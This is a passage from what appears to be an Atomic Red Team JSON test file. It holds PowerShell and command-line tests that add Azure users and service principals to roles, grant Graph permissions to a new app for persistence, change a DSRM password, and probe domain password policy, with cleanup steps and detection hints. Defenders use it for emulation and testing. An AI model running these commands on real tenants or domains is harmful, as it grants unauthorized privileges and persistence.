found\"; exit }\n\nRemove-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -MemberId $sp.ObjectId\nWrite-Host \"Service Principal $($sp.DisplayName) was removed from $($role.DisplayName) role\"\n", "name": "powershell", "elevation_required": false}}, {"name": "Azure - adding user to Azure role in subscription", "auto_generated_guid": "1a94b3fc-b080-450a-b3d8-6d9b57b472ea", "description": "The adversaries want to add user to some Azure role, also called Azure resource role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Owner, Contributor.\nBy default, the role Reader is assigned to user in this test.\n\nNew-AzRoleAssignment cmdlet could be also use to assign user/service principal to resource, resource group and management group.\n\nThe account you use to run the PowerShell command must have Microsoft.Authorization/roleAssignments/write \n(e.g. such as User Access Administrator or Owner) and the Azure Active Directory Graph Directory.Read.All \nand Microsoft Graph Directory.Read.All permissions.\n\nDetection hint - check Operation Name \"Create role assignment\" in subscriptions Activity Logs.\n", "supported_platforms": ["iaas:azure"], "input_arguments": {"username": {"description": "Azure AD username", "type": "string", "default": "jonh@contoso.com"}, "password": {"description": "Azure AD password", "type": "string", "default": "p4sswd"}, "user_principal_name": {"description": "Display Name, or User Principal Name, of the targeted user principal", "type": "string", "default": "SuperUser"}, "role_name": {"description": "Name of the targeted Azure role", "type": "string", "default": "Reader"}, "subscription": {"description": "Name of the targeted subscription", "type": "string", "default": "Azure subscription 1"}}, "dependencies": [{"description": "Az.Resources module must be installed.\n", "prereq_command": "try {if (Get-InstalledModule -Name Az.Resources -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n", "get_prereq_command": "Install-Module -Name Az.Resources -Force\n"}], "executor": {"command": "Import-Module -Name Az.Resources\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzAccount -Credential $Credential\n\n$user = Get-AzADUser | where-object {$_.DisplayName -eq \"#{user_principal_name}\" -or $_.UserPrincipalName -eq \"#{user_principal_name}\" }\nif ($user -eq $null) { Write-Warning \"User not found\"; exit }\n$subscription = Get-AzSubscription | where-object {$_.Name -eq \"#{subscription}\"}\nif ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }\n$role = Get-AzRoleDefinition | where-object {$_.Name -eq \"#{role_name}\"}\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\n\nNew-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription\nWrite-Host \"User $($user.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)\"\n", "cleanup_command": "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzAccount -Credential $Credential -ErrorAction Ignore\n\n$user = Get-AzADUser | where-object {$_.DisplayName -eq \"#{user_principal_name}\" -or $_.UserPrincipalName -eq \"#{user_principal_name}\" }\nif ($user -eq $null) { Write-Warning \"User not found\"; exit }\n$subscription = Get-AzSubscription | where-object {$_.Name -eq \"#{subscription}\"}\nif ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }\n$role = Get-AzRoleDefinition | where-object {$_.Name -eq \"#{role_name}\"}\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\n\nRemove-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription\nWrite-Host \"User Principal $($sp.DisplayName) was removed from $($role.Name) role in subscriptions $($subscriptions.Name)\"\n", "name": "powershell", "elevation_required": false}}, {"name": "Azure - adding service principal to Azure role in subscription", "auto_generated_guid": "c8f4bc29-a151-48da-b3be-4680af56f404", "description": "The adversaries want to add service principal to some Azure role, also called Azure resource role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Owner, Contributor.\nBy default, the role Reader is assigned to service principal in this test.\n\nNew-AzRoleAssignment cmdlet could be also use to assign user/service principal to resource, resource group and management group.\n\nThe account you use to run the PowerShell command must have Microsoft.Authorization/roleAssignments/write \n(e.g. such as User Access Administrator or Owner) and the Azure Active Directory Graph Directory.Read.All \nand Microsoft Graph Directory.Read.All permissions.\n\nDetection hint - check Operation Name \"Create role assignment\" in subscriptions Activity Logs.\n", "supported_platforms": ["iaas:azure"], "input_arguments": {"username": {"description": "Azure AD username", "type": "string", "default": "jonh@contoso.com"}, "password": {"description": "Azure AD password", "type": "string", "default": "p4sswd"}, "service_principal_name": {"description": "Name of the service principal", "type": "string", "default": "SuperSP"}, "role_name": {"description": "Name of the targeted Azure role", "type": "string", "default": "Reader"}, "subscription": {"description": "Name of the targeted subscription", "type": "string", "default": "Azure subscription 1"}}, "dependencies": [{"description": "Az.Resources module must be installed.\n", "prereq_command": "try {if (Get-InstalledModule -Name Az.Resources -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n", "get_prereq_command": "Install-Module -Name Az.Resources -Force\n"}], "executor": {"command": "Import-Module -Name Az.Resources\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzAccount -Credential $Credential\n\n$sp = Get-AzADServicePrincipal | where-object {$_.DisplayName -eq \"#{service_principal_name}\"}\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n$subscription = Get-AzSubscription | where-object {$_.Name -eq \"#{subscription}\"} \nif ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }\n$role = Get-AzRoleDefinition | where-object {$_.Name -eq \"#{role_name}\"}\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\n\nNew-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription\nWrite-Host \"Service Principal $($sp.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)\"\n", "cleanup_command": "Import-Module -Name AzureAD -ErrorAction Ignore\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzAccount -Credential $Credential -ErrorAction Ignore\n\n$sp = Get-AzADServicePrincipal | where-object {$_.DisplayName -eq \"#{service_principal_name}\"}\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n$subscription = Get-AzSubscription | where-object {$_.Name -eq \"#{subscription}\"} \nif ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }\n$role = Get-AzRoleDefinition | where-object {$_.Name -eq \"#{role_name}\"}\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\n\nRemove-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription\nWrite-Host \"Service Principal $($sp.DisplayName) was removed from $($role.Name) role in subscriptions $($subscriptions.Name)\"\n", "name": "powershell", "elevation_required": false}}, {"name": "Azure AD - adding permission to application", "auto_generated_guid": "94ea9cc3-81f9-4111-8dde-3fb54f36af4b", "description": "The adversaries want to add permission to newly created application. Application could be then used for persistence or for further operation in the attacked infrastructure. Permissions like AppRoleAssignment.ReadWrite.All or RoleManagement.ReadWrite.Directory in particular can be a valuable target for a threat actor.\nThis technique will create a new app, with the provided name, and give it the provided permission. But if you prefer to add credentials to an existing app, replace in the code: \"Get-AzureADApplication\" instead of \"New-AzureADServicePrincipal\".\nThe DirectoryRecommendations.Read.All permissions has been selected as the default.\n\nThe account you use to run the PowerShell command should have Global Administrator/Application Administrator/Cloud Application Administrator role in your Azure AD.\n\nDetection hint - check Operation Name \"Add app role assignment to service principal\" in subscriptions Activity Logs.\nYou can also take a look at the materials:\nhttps://learnsentinel.blog/2022/01/04/azuread-privesc-sentinel/\nhttps://github.com/reprise99/Sentinel-Queries\nhttps://docs.google.com/presentation/d/1AWx1w0Xcq8ENvOmSjAJswEgEio-il09QWZlGg9PbHqE/edit#slide=id.g10460eb209c_0_2766\nhttps://gist.github.com/andyrobbins/7c3dd62e6ed8678c97df9565ff3523fb\n", "supported_platforms": ["azure-ad"], "input_arguments": {"username": {"description": "Azure AD username", "type": "string", "default": "jonh@contoso.com"}, "password": {"description": "Azure AD password", "type": "string", "default": "p4sswd"}, "application_name": {"description": "Name of the targeted application that will be created", "type": "string", "default": "test_app"}, "application_permission": {"description": "Permission from Microsoft Graph Resource API that will be added to application", "type": "string", "default": "DirectoryRecommendations.Read.All"}}, "dependencies": [{"description": "AzureAD module must be installed.\n", "prereq_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n", "get_prereq_command": "Install-Module -Name AzureAD -Force\n"}], "executor": {"command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential\n\n$aadApplication = New-AzureADApplication -DisplayName \"#{application_name}\"\n$servicePrincipal = New-AzureADServicePrincipal -AppId $aadApplication.AppId\n#$aadApplication = Get-AzureADApplication -Filter \"DisplayName eq '#{application_name}'\"\n\n#Get Service Principal of Microsoft Graph Resource API \n$graphSP = Get-AzureADServicePrincipal -Filter \"DisplayName eq 'Microsoft Graph'\"\n\n#Initialize RequiredResourceAccess for Microsoft Graph Resource API \n$requiredGraphAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess\n$requiredGraphAccess.ResourceAppId = $graphSP.AppId\n$requiredGraphAccess.ResourceAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.ResourceAccess]\n\n#Set Application Permissions\n$ApplicationPermissions = @('#{application_permission}')\n\n$reqPermission = $graphSP.AppRoles | Where-Object {$_.Value -eq $ApplicationPermissions}\nif($reqPermission)\n{\n$resourceAccess = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess\n$resourceAccess.Type = \"Role\"\n$resourceAccess.Id = $reqPermission.Id    \n#Add required app permission\n$requiredGraphAccess.ResourceAccess.Add($resourceAccess)\n}\nelse\n{\nWrite-Host \"App permission $permission not found in the Graph Resource API\" -ForegroundColor Red\n}\n\n#Add required resource accesses\n$requiredResourcesAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.RequiredResourceAccess]\n$requiredResourcesAccess.Add($requiredGraphAccess)\n\n#Set permissions in existing Azure AD App\nSet-AzureADApplication -ObjectId $aadApplication.ObjectId -RequiredResourceAccess $requiredResourcesAccess\n\n$servicePrincipal = Get-AzureADServicePrincipal -Filter \"AppId eq '$($aadApplication.AppId)'\"\n\nNew-AzureADServiceAppRoleAssignment -ObjectId $servicePrincipal.ObjectId -PrincipalId $servicePrincipal.ObjectId -ResourceId $graphSP.ObjectId -Id $reqPermission.Id\n", "cleanup_command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential\n\n$aadApplication = @(Get-AzureADApplication -Filter \"DisplayName eq '#{application_name}'\")\nIf ($aadApplication.Count -eq 0)\n{\n  Write-Host \"App not found: cannot delete it\"\n  exit\n}\nElseIf ($aadApplication.Count -gt 1)\n{\n  Write-Host \"Found several app with name '#{application_name}': one is likely the one this technique created, but as a precaution, none will be deleted. Manual cleanup is required.\"\n  exit\n}\nElse\n{\n  Remove-AzureADApplication -ObjectId $aadApplication[0].ObjectId\n  Write-Host \"Successfully deleted app\"\n}\n", "name": "powershell", "elevation_required": false}}, {"name": "Password Change on Directory Service Restore Mode (DSRM) Account", "auto_generated_guid": "d5b886d9-d1c7-4b6e-a7b0-460041bf2823", "description": "Change the password on the Directory Service Restore Mode (DSRM) account using ntdsutil by syncing to existing account\n", "supported_platforms": ["windows"], "input_arguments": {"sync_account": {"description": "Account to sync password from", "type": "string", "default": "%username%"}}, "executor": {"name": "command_prompt", "elevation_required": true, "command": "ntdsutil \"set dsrm password\" \"sync from domain account #{sync_account}\" \"q\" \"q\"\n"}}, {"name": "Domain Password Policy Check: Short Password", "auto_generated_guid": "fc5f9414-bd67-4f5f-a08e-e5381e29cbd1", "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password.  You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was.\n", "supported_platforms": ["windows"], "input_arguments": {"new_password": {"description": "The password to set for the current domain user (default value is 7 characters)", "type": "string", "default": "Uplow-1"}, "cred_file": {"description": "A file containing the password of the current user", "type": "path", "default": "$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"}}, "dependencies": [{"description": "Password for current user must be stored in a credential file\n", "prereq_command": "if (Test-Path #{cred_file}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{cred_file}\") -ErrorAction Ignore | Out-Null\n$cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"\n$cred.Password | ConvertFrom-SecureString | Out-File \"#{cred_file}\"\n"}], "executor": {"name": "powershell", "command": "$credFile = \"#{cred_file}\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"#{new_password}\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to #{new_password}\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"#{new_password}\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n"}}, {"name": "Domain Password Policy Check: No Number in Password", "auto_generated_guid": "68190529-069b-4ffc-a942-919704158065", "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n", "supported_platforms": ["windows"], "input_arguments": {"new_password": {"description": "The password to set for the current domain user (default is long and has upper and lower case and special character but no number)", "type": "string", "default": "UpperLowerLong-special"}, "cred_file": {"description": "A file containing the password of the current user", "type": "path", "default": "$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"}}, "dependencies": [{"description": "Password for current user must be stored in a credential file\n", "prereq_command": "if (Test-Path #{cred_file}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{cred_file}\") -ErrorAction Ignore | Out-Null\n$cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"\n$cred.Password | ConvertFrom-SecureString | Out-File \"#{cred_file}\"\n"}], "executor": {"name": "powershell", "command": "$credFile = \"#{cred_file}\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"#{new_password}\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to #{new_password}\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"#{new_password}\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n"}}, {"name": "Domain Password Policy Check: No Special Character in Password", "auto_generated_guid": "7d984ef2-2db2-4cec-b090-e637e1698f61", "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n", "supported_platforms": ["windows"], "input_arguments": {"new_password": {"description": "The password to set for the current domain user (default is long and has upper and lower case and number but no special character)", "type": "string", "default": "UpperLowerLong333noSpecialChar"}, "cred_file": {"description": "A file containing the password of the current user", "type": "path", "default": "$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"}}, "dependencies": [{"description": "Password for current user must be stored in a credential file\n", "prereq_command": "if (Test-Path #{cred_file}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{cred_file}\") -ErrorAction Ignore | Out-Null\n$cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"\n$cred.Password | ConvertFrom-SecureString | Out-File \"#{cred_file}\"\n"}], "executor": {"name": "powershell", "command": "$credFile = \"#{cred_file}\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"#{new_password}\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to #{new_password}\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"#{new_password}\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n"}}, {"name": "Domain Password Policy Check: No Uppercase Character in Password", "auto_generated_guid": "b299c120-44a7-4d68-b8e2-8ba5a28511ec", "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n", "supported_platforms": ["windows"], "input_arguments": {"new_password": {"description": "The password to set for the current domain user (default is long and has and lower case and special character and number but no uppercase)", "type": "string", "default": "lower-long-special-333"}, "cred_file": {"description": "A file containing the password of the current user", "type": "path", "default": "$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"}}, "dependencies": [{"description": "Password for current user must be stored in a credential file\n", "prereq_command": "if (Test-Path #{cred_file}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{cred_file}\") -ErrorAction Ignore | Out-Null\n$cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"\n$cred.Password | ConvertFrom-SecureString | Out-File \"#{cred_file}\"\n"}], "executor": {"name": "powershell", "command": "$credFile = \"#{cred_file}\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"#{new_password}\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to #{new_password}\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"#{new_password}\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n"}}, {"name": "Domain Password Policy Check: No Lowercase Character in Password", "auto_generated_guid": "945da11e-977e-4dab-85d2-f394d03c5887", "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n", "supported_platforms": ["windows"], "input_arguments": {"new_password": {"description": "The password to set for the current domain user (default is long and has and upper case and special character and number but no lowercase)", "type": "string", "default": "UPPER-LONG-SPECIAL-333"}, "cred_file": {"description": "A file containing the password of the current user", "type": "path", "default": "$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"}}, "dependencies": [{"description": "Password for current user must be stored in a credential file\n", "prereq_command": "if (Test-Path #{cred_file}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{cred_file}\") -ErrorAction Ignore | Out-Null\n$cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"\n$cred.Password | ConvertFrom-SecureString | Out-File \"#{cred_file}\"\n"}], "executor": {"name": "powershell", "command": "$credFile = \"#{cred_file}\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"#{new_password}\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to #{new_password}\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"#{new_password}\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n"}}, {"name": "Domain Password Policy Check: Only Two Character Classes", "auto_generated_guid": "784d1349-5a26-4d20-af5e-d6af53bae460", "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n", "supported_platforms": ["windows"], "input_arguments": {"new_password": {"description": "The password to set for the current domain user (default has only upper and lower case characters)", "type": "string", "default": "onlyUPandLowChars"}, "cred_file": {"description": "A file containing the password of the current user", "type": "path", "default": "$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"}}, "dependencies": [{"description": "Password for current user must be stored in a credential file\n", "prereq_command": "if (Test-Path #{cred_file}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{cred_file}\") -ErrorAction Ignore | Out-Null\n$cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"\n$cred.Password | ConvertFrom-SecureString | Out-File \"#{cred_file}\"\n"}], "executor": {"name": "powershell", "command": "$credFile = \"#{cred_file}\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"#{new_password}\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to #{new_password}\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"#{new_password}\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n"}}, {"name": "Domain Password Policy Check: Common Password Use", "auto_generated_guid": "81959d03-c51f-49a1-bb24-23f1ec885578", "description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n", "supported_platforms": ["windows"], "input_arguments": {"new_password": {"description": "The password to set for the current domain user (default is Season and current year combo)", "type": "string", "default": "Spring$((Get-Date).Year)!"}, "cred_file": {"description": "A file containing the password of the current user", "type": "path", "default": "$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"}}, "dependencies": [{"description": "Password for current user must be stored in a credential file\n", "prereq_command": "if (Test-Path #{cred_file}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path \"#{cred_file}\") -ErrorAction Ignore | Out-Null\n$cred = Get-Credential -UserName  $env:USERNAME -message \"Enter password for $env:USERNAME to use during password change attempt\"\n$cred.Password | ConvertFrom-SecureString | Out-File \"#{cred_file}\"\n"}], "executor": {"name": "powershell", "command": "$credFile = \"#{cred_file}\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"#{new_password}\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to #{new_password}\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"#{new_password}\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n"}}, {"name": "GCP - Delete Service Account Key", "auto_generated_guid": "7ece1dea-49f1-4d62-bdcc-5801e3292510", "description": "This Atomic will: \n  - Create a service account\n  - Create a service account key, \n  - Store the result of retrieving a single key for that service account as a variable\n  - Pass that variable for deletion\n  - Delete the service account\n\nThe idea for this Atomic came from a Rule published by the Elastic 